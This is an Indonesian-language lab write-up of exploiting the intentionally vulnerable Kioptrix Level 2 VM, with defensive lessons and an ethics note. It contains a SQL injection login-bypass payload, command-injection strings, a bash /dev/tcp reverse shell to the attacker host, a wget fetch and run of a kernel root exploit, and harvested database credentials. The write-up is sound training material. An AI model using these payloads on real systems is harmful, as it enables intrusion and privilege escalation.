# Laporan Praktik: Eksploitasi Kioptrix Level 2 (SQL Injection, Command Injection & Kernel Privilege Escalation)

**Tujuan:** Latihan keamanan siber (penetration testing) di lingkungan lab terisolasi, dengan fokus pada rantai serangan **web application attack chain** — SQL injection untuk bypass autentikasi, command injection untuk eksekusi perintah OS, credential hunting dari source code aplikasi, hingga privilege escalation lewat kernel exploit. Target ini melengkapi gap terbesar dari dua laporan sebelumnya: belum pernah ada eksploitasi murni dari sisi aplikasi web.

**Lingkungan lab:**
- Target: Kioptrix Level 2 (`192.168.56.103`) — VM berbasis CentOS 4.5, dirilis oleh author yang sama dengan Kioptrix Level 1
- Attacker: terminal host langsung (Host-only network)
- Jaringan: VirtualBox Host-only Adapter (`vboxnet0`, subnet `192.168.56.0/24`)
- Tools: Nmap, curl, netcat, GCC, Searchsploit

> ⚠️ Semua teknik di laporan ini hanya sah dipakai pada sistem milik sendiri atau dengan izin eksplisit. Kioptrix sengaja dibuat rentan untuk tujuan edukasi, didownload dari sumber resmi (vulnhub.com).

---

## Ringkasan Alur

```
1. Setup VM (VBoxManage CLI) + troubleshooting tambahan (audio driver crash)
        ↓
2. Reconnaissance (Nmap)
        ↓
3. SQL Injection → bypass halaman login
        ↓
4. Command Injection pada fitur "Ping a Machine" → akses shell (user apache)
        ↓
5. Credential hunting dari source code aplikasi (config database)
        ↓
6. Percobaan privilege escalation gagal (2x) — pelajaran dari kegagalan
        ↓
7. Privilege escalation berhasil via kernel exploit (sock_sendpage, CVE-2009-2692) → root
```

---

## Tahap 1 — Setup VM & Troubleshooting Tambahan

Setup dasar mengikuti pola yang sudah terbukti dari laporan Kioptrix Level 1 (Host-only network, NIC type PCnet):

```bash
VBoxManage createvm --name "Kioptrix_Level_2" --ostype "Linux26" --register
VBoxManage modifyvm "Kioptrix_Level_2" --memory 512 --cpus 1
VBoxManage storagectl "Kioptrix_Level_2" --name "IDE Controller" --add ide
VBoxManage storageattach "Kioptrix_Level_2" --storagectl "IDE Controller" \
  --port 0 --device 0 --type hdd \
  --medium "/home/admin/Downloads/Kioptrix Level 2/CentOs4.5.vmdk"
VBoxManage modifyvm "Kioptrix_Level_2" --nic1 hostonly --hostonlyadapter1 vboxnet0
VBoxManage modifyvm "Kioptrix_Level_2" --nictype1 Am79C973
```

### Masalah baru: VM berstatus "Aborted" saat boot

Berbeda dari masalah network di Level 1, kali ini VM mati sendiri (`Aborted`) di tengah proses boot tanpa pesan error jelas di awal. Investigasi log (`VBox.log`) menunjukkan proses berhenti tiba-tiba di tengah inisialisasi **audio controller (AC97/ALSA)** — indikasi crash pada driver audio host, bukan masalah pada VM/disk itu sendiri.

**Solusi:** nonaktifkan audio controller VM, karena target pentest tidak memerlukan audio sama sekali:
```bash
VBoxManage modifyvm "Kioptrix_Level_2" --audio-driver none
VBoxManage startvm "Kioptrix_Level_2" --type gui
```

VM berhasil boot normal setelah ini.

---

## Tahap 2 — Reconnaissance

```bash
nmap -sn 192.168.56.0/24
# 192.168.56.103 — Kioptrix Level 2 terdeteksi
```

```bash
nmap -sV -sC -p- 192.168.56.103
```

**Hasil:**

| Port | Layanan | Versi |
|---|---|---|
| 22 | SSH | OpenSSH 3.9p1 (protocol 1.99, SSHv1 enabled) |
| 80 | HTTP | Apache 2.0.52 (CentOS) |
| 111 | rpcbind | v2 |
| 443 | HTTPS | SSL (SSLv2 enabled, deprecated) |
| 631 | CUPS | 1.1 |
| 3306 | MySQL | Terbuka langsung ke publik |

Port 80 (web app) dan 3306 (MySQL terbuka) menjadi fokus utama — konsisten dengan rencana eksploitasi SQL injection.

---

## Tahap 3 — SQL Injection: Bypass Halaman Login

Mengakses `http://192.168.56.103/` menampilkan form login sederhana:
```html
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
  <input name="uname" type="text">
  <input name="psw" type="password">
  <input type="submit" name="btnLogin" value="Login">
</form>
```

Payload SQL injection klasik dikirim lewat `curl` (sambil menyimpan session cookie untuk request berikutnya):
```bash
curl -s -c cookies.txt -b cookies.txt \
  --data-urlencode "uname=' or 1=1-- -" \
  --data-urlencode "psw=apapun" \
  --data-urlencode "btnLogin=Login" \
  http://192.168.56.103/index.php -o after_login.html
```

**Hasil:** berhasil bypass, halaman setelah login menampilkan **"Welcome to the Basic Administrative Web Console"** beserta form fitur ping:
```html
<form name="ping" action="pingit.php" method="post" target="_blank">
  <input type="text" name="ip" size="30">
  <input type="submit" value="submit" name="submit">
</form>
```

**Analisis teknis:** query backend kemungkinan berbentuk `SELECT * FROM users WHERE username='$uname' AND password='$psw'`. Payload `' or 1=1-- -` mengubah kondisi WHERE menjadi selalu benar, dan `-- -` meng-comment-out sisa query (termasuk validasi password), membuat sistem menganggap autentikasi berhasil tanpa kredensial valid.

---

## Tahap 4 — Command Injection: Dari Form Ping ke Shell

### Identifikasi celah

Form ping di atas diuji dengan payload command chaining:
```
127.0.0.1 && id
```

**Hasil (lewat browser):**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=48(apache) gid=48(apache) groups=48(apache)
```

Output `id` yang ikut tereksekusi membuktikan input tidak disanitasi — form ini rentan **OS command injection**, bukan SQL injection (celah berbeda dari Tahap 3, meski di aplikasi yang sama).

### Eksploitasi menuju reverse shell

Listener disiapkan di attacker:
```bash
nc -lvnp 4444
```

**Percobaan pertama (gagal, menyebabkan VM hang):**
```
127.0.0.1 && bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
```
Payload ini menggantung tanpa batas karena dikirim lewat form (bukan background process) — request HTTP yang memicu shell tidak pernah selesai, membuat worker Apache macet total hingga VM perlu di-reset (`VBoxManage controlvm "Kioptrix_Level_2" reset`).

**Percobaan kedua (berhasil, dengan koreksi):** payload dijalankan di background (`&`) dan `curl` dibatasi waktu tunggu (`--max-time`) supaya tidak ikut macet:
```bash
curl -s -b cookies.txt --max-time 5 \
  --data-urlencode "ip=127.0.0.1 && bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1 &'" \
  --data-urlencode "submit=submit" \
  http://192.168.56.103/pingit.php
```

**Hasil:** reverse shell berhasil masuk ke listener, stabil (tidak membuat server hang lagi):
```
Connection received on 192.168.56.103 32769
bash: no job control in this shell
bash-3.00$ whoami
apache
```

---

## Tahap 5 — Credential Hunting dari Source Code Aplikasi

Source code aplikasi web diperiksa langsung dari shell yang sudah didapat:
```bash
cat /var/www/html/index.php
```

**Ditemukan kredensial database tertulis langsung di kode (hardcoded):**
```php
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
```

### Percobaan 1 — login SSH/su dengan kredensial ini (gagal)
```bash
su - john
# Password: hiroshima
# su: incorrect password
```
Kredensial `john`/`hiroshima` ternyata **khusus untuk akses MySQL**, bukan akun sistem operasi (user OS `john` kalaupun ada, punya password berbeda) — pelajaran penting: kredensial aplikasi dan kredensial OS adalah dua hal yang terpisah, tidak boleh diasumsikan sama.

### Percobaan 2 — gunakan kredensial untuk akses MySQL langsung (berhasil)
```bash
mysql -u john -phiroshima -e "SELECT user, password FROM mysql.user;" 2>/dev/null
```
**Hasil:**
```
+------+------------------+
| user | password         |
+------+------------------+
| root | 5a6914ba69e02807 |
| john | 5a6914ba69e02807 |
+------+------------------+
```
Hash password MySQL berhasil didapat, namun ini adalah hash level **database (mysql.user)**, bukan hash password OS (`/etc/shadow`) — jalur ini tidak langsung memberi akses shell sistem meski berguna sebagai temuan tambahan.

---

## Tahap 6 — Percobaan Privilege Escalation yang Gagal (Dokumentasi Pembelajaran)

Dua percobaan privilege escalation sempat gagal sebelum berhasil — didokumentasikan karena prosesnya sama berharganya dengan keberhasilan akhir.

### Percobaan 1 — CVE-2009-2698 (`ip_append_data()`, exploit-db 9542.c)

```bash
uname -a
# Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```

Exploit ini secara eksplisit disebutkan kompatibel dengan "CentOS 4.4/4.5" di judulnya, tampak sangat cocok. Namun setelah berulang kali dijalankan (termasuk dengan loop otomatis), hasilnya selalu `[-] exploit failed, try again`.

**Root cause ditemukan:** komentar di source code exploit menyebutkan exploit ini di-test pada kernel **`2.6.9-55.ELsmp`** (varian SMP), sedangkan target menjalankan **`2.6.9-55.EL`** (non-SMP):
```bash
ls /boot/vmlinuz-*
# /boot/vmlinuz-2.6.9-55.EL   (hanya satu, varian non-SMP)
rpm -qa | grep kernel
# kernel-smp-devel ada, tapi tidak ada paket kernel-smp runtime
```
Build SMP dan non-SMP punya offset struct data kernel yang berbeda meski version string-nya identik — exploit yang dikompilasi dengan asumsi offset SMP tidak akan pernah berhasil di kernel non-SMP, berapa kali pun dicoba.

### Percobaan 2 — CVE-2009-1185 (udev netlink, exploit-db 8572.c)

```bash
ps aux | grep udev
# root 1583 ... udevd  — proses berjalan sebagai root
```
Prasyarat dasar (udevd jalan sebagai root) terpenuhi, namun exploit gagal dengan pesan:
```
[-] Error: Required 95-udev-late.rules not found
```
**Root cause:** exploit ini bergantung pada keberadaan file `/etc/udev/rules.d/95-udev-late.rules` sebagai tempat ia menyisipkan rule udev berbahaya. Pengecekan langsung menunjukkan:
```bash
ls -la /etc/udev/rules.d/
# hanya ada: 50-udev.rules, 51-by-id.rules, 90-ib.rules — tidak ada 95-udev-late.rules
# permission direktori: root:root, mode 755 (tidak writable oleh user apache)
```
File yang dibutuhkan memang tidak pernah ada di struktur udev CentOS 4.5 ini, dan direktori juga tidak writable oleh user non-root. Exploit ini secara struktural tidak kompatibel dengan sistem target, terlepas dari argumen yang diberikan.

**Pelajaran dari dua kegagalan ini:** nomor versi kernel/OS yang terlihat cocok di judul exploit tidak menjamin kompatibilitas penuh — perlu verifikasi prasyarat teknis exploit (build variant, file dependency, permission) sebelum menghabiskan waktu pada satu exploit tertentu.

---

## Tahap 7 — Privilege Escalation Berhasil: sock_sendpage (CVE-2009-2692)

Pivot ke pencarian exploit lain yang lebih sesuai:
```bash
searchsploit sock_sendpage
searchsploit 2.6.9 | grep -i local
```

Exploit **`linux/local/9545.c`** dipilih sebagai kandidat berikutnya — memanfaatkan NULL pointer dereference pada fungsi `sock_sendpage()` di kernel Linux 2.4.x/2.6.x (CVE-2009-2692), celah yang berbeda dari dua percobaan sebelumnya dan tidak bergantung pada variant SMP atau file rules tertentu.

### Transfer dan eksekusi

Di attacker:
```bash
searchsploit -m linux/local/9545.c
cd ~/kioptrix2-exploit
python3 -m http.server 8080
```

Di shell target:
```bash
set +H
wget http://192.168.56.1:8080/9545.c -O /tmp/exploit.c
gcc /tmp/exploit.c -o /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit
```

**Hasil:**
```
sh-3.00#
```
Prompt berubah dari `bash-3.00$` menjadi `sh-3.00#` — tanda privilege berhasil naik ke root.

---

## Analisis Teknis

| Aspek | Detail |
|---|---|
| Vektor awal | SQL injection (auth bypass) → command injection (RCE) → credential hunting (source code) |
| Privilege escalation gagal #1 | CVE-2009-2698 — build kernel variant (SMP vs non-SMP) tidak cocok |
| Privilege escalation gagal #2 | CVE-2009-1185 — dependency file (`95-udev-late.rules`) tidak ada di sistem target |
| Privilege escalation berhasil | CVE-2009-2692 (`sock_sendpage`) — NULL pointer dereference di kernel, tidak bergantung pada file dependency atau kernel build variant tertentu |
| Root cause aplikasi web | Tidak ada input sanitization pada form login (SQLi) maupun form ping (command injection) — dua celah independen di aplikasi yang sama |
| Root cause tambahan | Kredensial database di-hardcode langsung di source code PHP, dapat dibaca begitu akses file system didapat |

---

## Temuan & Pelajaran Keamanan

1. **Validasi input di setiap titik masuk** — aplikasi ini gagal mengamankan dua form berbeda (login dan ping) dengan cara yang sama persis (tidak ada sanitasi), menunjukkan masalah sistemik dalam cara developer menangani input user, bukan cuma satu baris kode yang salah.
2. **Hardcoded credential adalah risiko besar** — begitu attacker mendapat akses baca file (lewat command injection), kredensial database langsung terekspos. Kredensial semestinya disimpan di environment variable atau secrets manager, bukan di source code.
3. **Payload harus mempertimbangkan sifat proses eksekusinya** — command injection yang dikirim lewat form dapat menyebabkan denial-of-service tidak sengaja (worker web server macet) kalau payload bersifat blocking; proses perlu dijalankan sebagai background job.
4. **Exploit compatibility butuh verifikasi, bukan asumsi dari judul** — dua kegagalan privilege escalation menunjukkan pentingnya memeriksa detail teknis (build variant, file dependency, permission) sebelum menyimpulkan exploit "seharusnya" bekerja.
5. **Kredensial aplikasi ≠ kredensial sistem operasi** — password yang valid untuk login MySQL (`john`/`hiroshima`) tidak otomatis valid untuk akun OS dengan nama yang sama; dua lapisan autentikasi ini perlu diuji terpisah.
6. **Database exposed langsung ke jaringan (port 3306) memperluas attack surface** — MySQL yang bisa diakses dari luar localhost mempermudah eksploitasi lanjutan begitu kredensial didapat.

---

## Lampiran: Troubleshooting yang Dihadapi

| Masalah | Penyebab | Solusi |
|---|---|---|
| VM berstatus "Aborted" tanpa pesan error jelas | Crash pada inisialisasi driver audio (ALSA/AC97) host | `VBoxManage modifyvm ... --audio-driver none` |
| Firefox "can't connect to server" setelah kirim payload reverse shell | Payload blocking membuat worker Apache menggantung tanpa batas | Jalankan payload di background (`&`) + batasi waktu tunggu client (`curl --max-time`) |
| VM hang total setelah payload reverse shell pertama | Worker Apache habis terpakai oleh proses shell yang tidak pernah exit | `VBoxManage controlvm "Kioptrix_Level_2" reset` |
| `su - john` gagal meski password dari source code benar | Kredensial itu khusus untuk MySQL, bukan akun OS | Gunakan kredensial langsung untuk `mysql -u john -p...`, bukan `su` |
| Exploit CVE-2009-2698 gagal terus meski versi OS/kernel cocok di judul | Build kernel SMP vs non-SMP punya offset struct berbeda | Verifikasi varian build kernel (`rpm -qa \| grep kernel`, `ls /boot/vmlinuz-*`) sebelum pakai exploit tertentu |
| Exploit CVE-2009-1185 gagal dengan pesan file rules tidak ditemukan | Dependency file (`95-udev-late.rules`) tidak ada di struktur udev sistem ini, direktori juga tidak writable | Pivot ke exploit lain yang tidak bergantung pada file dependency spesifik |

---

## Catatan Etika

Seluruh praktik ini dilakukan pada VM lab pribadi yang terisolasi (Host-only network), bukan sistem produksi atau milik pihak lain. Teknik SQL injection, command injection, dan kernel exploitation tanpa izin eksplisit terhadap sistem pihak lain adalah tindak pidana di hampir semua yurisdiksi.
